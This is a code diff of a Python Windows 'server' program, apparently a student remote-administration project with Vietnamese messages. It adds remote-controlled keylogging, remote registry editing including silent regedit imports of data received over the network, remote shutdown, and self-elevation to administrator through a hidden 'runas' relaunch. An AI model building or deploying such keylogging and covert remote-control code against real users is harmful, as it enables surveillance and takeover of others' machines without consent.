@@ -11,22 +11,24 @@ from tkinter import filedialog
 from tkinter import ttk
 import winreg
 import keyboard
+import sys
 import mss
 import win32gui
 import win32process
 import psutil
-import appstart
-import win32api
-import win32con
 from serverDesigner import ServerApp
-import multiprocessing
+from Keylog import Keylogger
+import tkinter as tk
+import keyboard
+from shutdownDesigner import open_shutdown_app
+import tkinter as tk
 
 class ServerFunc(ServerApp):
     def __init__(self, *args, **kwargs):
         super().__init__(*args, **kwargs)
         self.recording = False
         self.recorded_keys = []
-        
+        self.keylogger = Keylogger()
 
     def receive_signal(self):
         try:
@@ -35,7 +37,7 @@ class ServerFunc(ServerApp):
             return "QUIT"
 
     def shutdown(self):
-        subprocess.Popen(["shutdown", "-s"])
+        open_shutdown_app()
 
     def base_registry_key(self, link):
         a = None
@@ -55,99 +57,130 @@ class ServerFunc(ServerApp):
 
     def get_value(self, a, link, value_name):
         try:
-            a = a.OpenSubKey(link)
-        except Exception:
+            sub_key = winreg.OpenKey(a, link)
+        except Exception as e:
+            print("Error opening registry key:", e)
             return "Lỗi"
+
+        print("Opened registry key:", link)
 
         try:
-            op = a.GetValue(value_name)
-        except Exception:
-            return "Lỗi"
+            op = winreg.QueryValueEx(sub_key, value_name)
+            value = op[0]  # Giá trị của value
+            value_type = op[1]  # Kiểu dữ liệu của value
+            print("Got value:", value_name)
+            print("Value:", value)
+            print("Value type:", value_type)
+            winreg.CloseKey(sub_key)  # Đóng registry key
+            return value
+        except Exception as e:
+            print("Error getting registry value:", e)
+            winreg.CloseKey(sub_key)  # Đóng registry key
+            return "Loi"
 
-        if op is not None:
-            if a.GetValueKind(value_name) == winreg.REG_MULTI_SZ:
-                s = " ".join(op)
-            elif a.GetValueKind(value_name) == winreg.REG_BINARY:
-                s = " ".join([str(byte) for byte in op])
-            else:
-                s = str(op)
-            return s
-        else:
-            return "Lỗi"
-
-    def set_value(self, a, link, value_name, value, type_value):
+    def set_value(self, a ,link, value_name, value, type_value):
         try:
-            a = a.OpenSubKey(link, True)
-        except Exception:
-            return "Lỗi"
-        
-        if a is not None:
-            kind = None
+            key = winreg.OpenKey(a, link, 0, winreg.KEY_SET_VALUE)
+            value_type = ""
             if type_value == "String":
-                kind = winreg.REG_SZ
-            elif type_value == "Binary":
-                kind = winreg.REG_BINARY
-            elif type_value == "DWORD":
-                kind = winreg.REG_DWORD
-            elif type_value == "QWORD":
-                kind = winreg.REG_QWORD
+                value_type = winreg.REG_SZ
             elif type_value == "Multi-String":
-                kind = winreg.REG_MULTI_SZ
+                value_type = winreg.REG_MULTI_SZ
             elif type_value == "Expandable String":
-                kind = winreg.REG_EXPAND_SZ
+                value_type = winreg.REG_EXPAND_SZ
+            elif type_value == "DWORD":
+                value_type = winreg.REG_DWORD
+                value = int(value)
+            elif type_value == "QWORD":
+                value_type = winreg.REG_QWORD
+                value = int(value)
+            elif type_value == "Binary":
+                value_type = winreg.REG_BINARY
+                value = bytes(map(int, value.split()))
             else:
-                return "Lỗi"
-            
-            v = value
-            try:
-                a.SetValue(value_name, v, kind)
-            except Exception:
-                return "Lỗi"
-            
-            return "Set value thành công"
-        else:
-            return "Lỗi"
+                return "Error: Invalid type"
+            winreg.SetValueEx(key, value_name, 0, value_type, value)
+            winreg.CloseKey(key)
+            return "Value set"
+        except Exception as e:
+            return f"Error: {e}"
 
     def delete_value(self, a, link, value_name):
         try:
-            a = a.OpenSubKey(link, True)
-        except Exception:
-            return "Lỗi"
-        
-        if a is not None:
-            try:
-                a.DeleteValue(value_name)
-            except Exception:
-                return "Lỗi"
-            
-            return "Xóa value thành công"
-        else:
-            return "Lỗi"
+            key = winreg.OpenKey(a, link, 0, winreg.KEY_SET_VALUE)
+            winreg.DeleteValue(key, value_name)
+            winreg.CloseKey(key)
+
+            return("Value deleted")
+        except Exception as e:
+            return(f"Error: {e}")
 
     def delete_key(self, a, link):
         try:
-            a.DeleteSubKey(link)
-        except Exception:
-            return "Lỗi"
-        return "Xóa key thành công"
+            winreg.DeleteKey(a, link)
+            return "Xoa key thanh cong"
+        except Exception as e:
+            return f"Error: {e}"
+
+    def create_key(self, a, link):
+        try:
+            key = winreg.CreateKey(a, link)
+            winreg.CloseKey(key)
+
+            return("Tao key thanh cong")
+        except Exception as e:
+            return(f"Error: {e}")
 
     def registry(self):
         s = ""
         with open("fileReg.reg", "w") as fs:
             pass
-        
+            
         while True:
             s = self.receive_signal()
             if s == "REG":
-                data = self.nr.read(5000).decode()
-                with open("fileReg.reg", "w") as fin:
-                    fin.write(data)
-                s = os.path.join(os.path.dirname(__file__), "fileReg.reg")
-                try:
-                    subprocess.run(["regedit.exe", "/s", s], timeout=20)
-                    self.nw.write("Sửa thành công\n")
-                except Exception:
-                    self.nw.write("Sửa thất bại\n")
+                    data = ""
+                    while True:
+                        line = self.nr.readline().strip()
+                        if not line:
+                            break
+                        data += line + "\n"
+                    with open("fileReg.reg", "w") as fin:
+                        fin.write(data)
+                    s = os.path.join(os.path.dirname(__file__), "fileReg.reg")
+                    try:
+                        subprocess.run(["regedit.exe", "/s", s], timeout=20)
+                        self.nw.write("Sua thanh cong\n")
+                    except Exception as ex:
+                        print("Error:", ex)
+                        self.nw.write("Sua that bai\n")
+                    self.nw.flush()
+            elif s == "SEND":
+                option = self.nr.readline().strip()
+                link = self.nr.readline().strip()
+                if(option != "Create key" or option != "Delete key"):
+                    value_name = self.nr.readline().strip()
+                if(option == "Set value"):
+                    value = self.nr.readline().strip()
+                    type_value = self.nr.readline().strip()
+                a = self.base_registry_key(link)
+                link2 = link[link.index('\\') + 1:]
+                if a is None:
+                    s = "Loi"
+                else:
+                    if option == "Create key":
+                        s = self.create_key(a, link2)
+                    elif option == "Delete key":
+                        s = self.delete_key(a, link2)
+                    elif option == "Get value":
+                        s = self.get_value(a, link2, value_name)
+                    elif option == "Set value":
+                        s = self.set_value(a, link2, value_name, value, type_value)
+                    elif option == "Delete value":
+                        s = self.delete_value(a, link2, value_name)
+                    else:
+                        s = "Loi"
+                self.nw.write(s + "\n")
                 self.nw.flush()
             elif s == "QUIT":
                 return
@@ -170,46 +203,29 @@ class ServerFunc(ServerApp):
             elif ss == "QUIT":
                 return
 
-    def hook_key(self, event_queue):
-        print("Hooking keys")
-        self.recording = True
-        self.recorded_keys = []
-        keyboard.on_press(self.record_key, event_queue)
+    def hookKey(self):
+        self.keylogger.hook()
 
-    def unhook(self, event_queue):
-        print("Unhooking keys")
-        self.recording = False
-        keyboard.unhook_all()
-        event_queue.put(None)  # Send a signal to stop the process
+    def unhook(self):
+        self.keylogger.unhook()
 
-    def record_key(self, event, event_queue=None):
-        if self.recording:
-            self.recorded_keys.append(event.name)
-            if event_queue:
-                event_queue.put(event.name)  # Send the recorded key to the queue
+    def printkeys(self):
+        s = self.keylogger.print()
+        self.nw.write(s.replace("\n", "\r") + "\n")
+        self.nw.flush()
 
     def key_log(self):
-        event_queue = multiprocessing.Queue()
-        process = multiprocessing.Process(target=self.process_keys, args=(event_queue,))
-        process.start()
+        s = ""
         while True:
-            s = self.receive_signal()  # Implement receive_signal function
+            s = self.receive_signal()
             if s == "PRINT":
-                self.print_keys()  # Implement print_keys function
+                self.printkeys()
             elif s == "HOOK":
-                self.hook_key(event_queue)  # Implement hook_key function
+                self.hookKey()
             elif s == "UNHOOK":
-                self.unhook(event_queue)  # Implement unhook function
+                self.unhook()
             elif s == "QUIT":
-                process.terminate()  # Terminate the process
-                break
-
-    def process_keys(self, event_queue):
-        while True:
-            key = event_queue.get()
-            if key is None:  # Received a stop signal
-                break
-            print("Received key:", key)
+                return
 
     def get_process_info_from_pid(self, pid):
         try:
@@ -279,7 +295,6 @@ class ServerFunc(ServerApp):
                             except Exception:
                                 self.nw.write("Loi\n")
                             self.nw.flush()
-        
             elif ss == "START":
                     ss = self.receive_signal()
                     if ss == "STARTID":
@@ -296,7 +311,6 @@ class ServerFunc(ServerApp):
                                 self.nw.flush()
                     
             elif ss == "QUIT":
-                return
                 break
 
     def process(self):
@@ -360,7 +374,6 @@ class ServerFunc(ServerApp):
                                 self.nw.flush()
 
             elif ss == "QUIT":
-                return
                 break
 
     def start_server(self):
@@ -379,10 +392,10 @@ class ServerFunc(ServerApp):
             print(s)
             if s == "KEYLOG":
                 self.key_log()
-            # elif s == "SHUTDOWN":
-            #     self.shutdown()
-            # elif s == "REGISTRY":
-            #     self.registry()
+            elif s == "SHUTDOWN":
+                self.shutdown()
+            elif s == "REGISTRY":
+                self.registry()
             if s == "TAKEPIC":
                 self.take_pic()
             elif s == "PROCESS":
@@ -394,8 +407,21 @@ class ServerFunc(ServerApp):
         
         self.client.close()
         self.server.close()
-  
+
+def run_as_admin():
+    try:
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            print("Already running with admin privileges.")
+            return True
+        else:
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
+            return False
+    except Exception as e:
+        print("Error:", e)
+        return False
+
 if __name__ == "__main__":
-    root = tk.Tk()
-    app = ServerFunc(root)
-    root.mainloop()
+    if run_as_admin():
+        root = tk.Tk()
+        app = ServerFunc(root)
+        root.mainloop()
